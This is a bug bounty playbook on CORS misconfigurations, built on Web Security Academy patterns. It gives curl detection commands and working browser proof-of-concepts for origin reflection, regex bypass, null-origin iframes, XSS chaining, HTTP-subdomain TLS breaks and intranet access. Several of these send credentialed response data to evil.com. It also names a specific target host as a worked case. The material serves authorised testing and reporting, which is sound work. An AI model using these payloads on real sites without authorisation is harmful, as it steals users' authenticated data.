# CORS Testing Playbook — Bug Bounty

> Source: PortSwigger Web Security Academy + bug bounty field patterns.
> Use this for ANY target with CORS (Access-Control-Allow-Origin / Access-Control-Allow-Credentials).

---

## Quick Recon

```bash
# 1. Detect CORS policy (with credentials)
curl -sI -H "Origin: https://evil.com" https://TARGET/PATH | grep -i 'access-control'

# 2. Null origin test
curl -sI -H "Origin: null" https://TARGET/PATH | grep -i 'access-control'

# 3. Subdomain trust check
curl -sI -H "Origin: https://evil.TARGET.com" https://TARGET/PATH | grep -i 'access-control'
```

Look for: `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true` = exploitable.

---

## Attack Vectors

### V1 — Arbitrary Origin Reflection (EASIEST)

**Pattern:** Server reflects any `Origin` header value in `Access-Control-Allow-Origin` response.

**Detection:**
```bash
curl -sI -H "Origin: https://evil.com" https://TARGET/api/data \
  | grep -E 'Access-Control-Allow-Origin: https://evil.com|Access-Control-Allow-Credentials: true'
```

**PoC (victim browser):**
```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    fetch('https://evil.com/log?data=' + encodeURIComponent(x.responseText));
};
x.open('GET', 'https://TARGET/api/data', true);
x.withCredentials = true;
x.send();
</script>
```

**Value:** LOW–MEDIUM (steal API keys, CSRF tokens, PII). HIGH if session tokens / financial data exposed.

---

### V2 — Regex / Suffix / Prefix Bypass on Origin Whitelist

**Pattern:** App whitelists origins via regex; regex has fixable flaws.

**Common regex mistakes:**
| Regex Flaw | Bypass Domain |
|---|---|
| `normal-website.com$` (suffix match) | `hackersnormal-website.com` |
| `^normal-website.com` (prefix match) | `normal-website.com.evil.net` |
| `.normal-website.com` (missing `^`/`$`) | `Xnormal-website.com` |
| `contains(normal-website)` | `normal-website.com.evil.net` |

**Test procedure:**
```bash
# Test suffix bypass
curl -sI -H "Origin: https://hackersTARGET.com" https://TARGET/api/ | grep 'Access-Control-Allow-Origin: https://hackersTARGET'

# Test prefix bypass
curl -sI -H "Origin: https://TARGET.com.evil.net" https://TARGET/api/ | grep 'Access-Control-Allow-Origin'

# Test with TLD dot
curl -sI -H "Origin: https://TARGETXcom.evil.net" https://TARGET/api/ | grep 'Access-Control-Allow-Origin'
```

**Value:** MEDIUM (same as V1 but bypasses intended restriction). Escalate if sensitive data behind auth.

---

### V3 — Whitelisted Null Origin

**Pattern:** App whitelists `Origin: null` (common in dev environments).

**Detection:**
```bash
curl -sI -H "Origin: null" https://TARGET/api/data \
  | grep 'Access-Control-Allow-Origin: null'
```

**PoC (sandboxed iframe):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var x = new XMLHttpRequest();
    x.onload = function() {
      fetch('https://evil.com/log?key=' + encodeURIComponent(x.responseText));
    };
    x.open('GET', 'https://TARGET/api/data', true);
    x.withCredentials = true;
    x.send();
  </script>">
</iframe>
```

**Value:** LOW–MEDIUM. Same auth caveat as V1.

---

### V4 — XSS Chain via CORS Trust Relationship

**Pattern:** Target trusts `sub.target.com` in CORS; that subdomain has XSS.

**Attack chain:** Find XSS on trusted subdomain → inject JS that makes credentialed CORS requests to target → exfiltrate data.

**Detection:**
```bash
# 1. Identify trusted subdomains
curl -sI -H "Origin: https://sub.target.com" https://TARGET/api/key \
  | grep 'Access-Control-Allow-Credentials: true'

# 2. Test each for XSS / open redirects / script sinks
```

**PoC:**
```
https://sub.target.com/?q=<script>
var x=new XMLHttpRequest();
x.onload=function(){location='https://evil.com/log?k='+x.responseText};
x.open('GET','https://TARGET/api/key',true);
x.withCredentials=true;
x.send();
</script>
```

**Value:** HIGH (chain of two bugs). Document both the XSS and the CORS misconfig in one finding.

---

### V5 — Breaking TLS via HTTP Trusted Subdomain

**Pattern:** Target is HTTPS-only but trusts an HTTP subdomain in CORS.

**Exploitation (MITM / network attacker):**
1. Victim makes any HTTP request → attacker injects 302 redirect to `http://trusted-sub.target.com`
2. Browser follows redirect (plain HTTP)
3. Attacker intercepts, returns spoofed page that makes CORS request to `https://TARGET`
4. Request includes `Origin: http://trusted-sub.target.com` (whitelisted)
5. Attacker reads sensitive data from CORS response

**Detection:**
```bash
curl -sI -H "Origin: http://trusted-sub.target.com" https://TARGET/api/ \
  | grep 'Access-Control-Allow-Origin: http://trusted-sub.target.com'
```

**Value:** MEDIUM–HIGH (requires network position / open WiFi).

---

### V6 — Intranet Access via CORS Without Credentials

**Pattern:** `Access-Control-Allow-Origin: *` on internal resources. Without credentials header, attacker can't steal auth data — BUT can access unauthenticated internal endpoints.

**Attack:** Target is intranet resource that returns data without auth (admin panels, internal APIs, monitoring dashboards).

**Detection:**
```bash
curl -sI -H "Origin: https://evil.com" http://10.0.0.5/api/health \
  | grep 'Access-Control-Allow-Origin: \*'
```

**PoC (exfil unauthenticated internal data):**
```html
<script>
fetch('http://10.0.0.5/api/admin', {mode: 'cors'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
</script>
```

**Value:** LOW (if public data) → HIGH (if internal PII, admin endpoints, config leaks).

---

## Screening Questions (Before Deep-Testing)

1. Does the target use `Access-Control-Allow-Credentials: true`?
2. Does the response origin match request origin exactly, or is it reflected / wildcarded?
3. Does the target whitelist `null`?
4. Is there a regex/pattern-based whitelist? (Test suffix/prefix/TLD bypass)
5. Which subdomains are trusted? Are any vulnerable to XSS / open redirect?
6. Are there HTTP (non-TLS) origins whitelisted?

---

## Important by-Design Filters

Skip these — they're normal/not buggy:
- Cloudinary/CDN public upload CORS `*` (public resources, by-design)
- Public API CORS `*` (APIs designed for third-party consumption)
- `Access-Control-Allow-Origin: *` without credentials (browser won't send cookies)
- `Access-Control-Allow-Credentials: false` (can't steal authenticated data)
- **WordPress core `rest_send_cors_headers()` reflects ANY Origin + `Access-Control-Allow-Credentials:
  true` on `/wp-json/*` BY DEFAULT** (WP does this so its own frontend/headless clients can make
  credentialed REST calls). A reflect+creds on a WP REST API is therefore WP-core-default, NOT a
  site misconfig — borderline hardening at most. Do NOT report it as a CORS vuln unless (a) the
  target is NOT WordPress (a custom API reflecting origin+creds is the real signal), or (b) the WP
  carve-out is absent/inconsistent across the estate (e.g. one WP host 301-redirects `/wp-json/`
  while another serves it reflected — worth a hardening note, still not a breach). If you do report
  it, frame honestly: "WP default behaviour; recommend restricting allowed origins", Low–Medium.
  The exploitable shape (logged-in user visits attacker page → `fetch(...,{credentials:'include'})`
  reads their REST data cross-origin, GET needs no nonce) is real but bounded by who logs into that
  WP host. Worked case: Zenya `developer.zenya-software.com/wp-json/*` (see the Zenya multi-tenant
  reference §9).

---

## Reporting Template

**Title:** CORS Misconfiguration — [Pattern: Arbitrary Reflection / Regex Bypass / Null Origin / XSS Chain / TLS Break / Intranet]

**Severity:** Varies by vector + data sensitivity (see per-vector notes above)

**Key CVSS considerations:**
- AV:N / AC:L if reflection is arbitrary
- AV:N / AC:H if requires MITM
- Impact tied to data sensitivity (PII = HIGH, public = LOW/INFO)

**Recommendation:** Specify exact trusted origins in `Access-Control-Allow-Origin`. Never reflect arbitrary origins with credentials. Avoid `null` whitelist. Use full-match regex (`^https://trusted\.domain\.com$`).
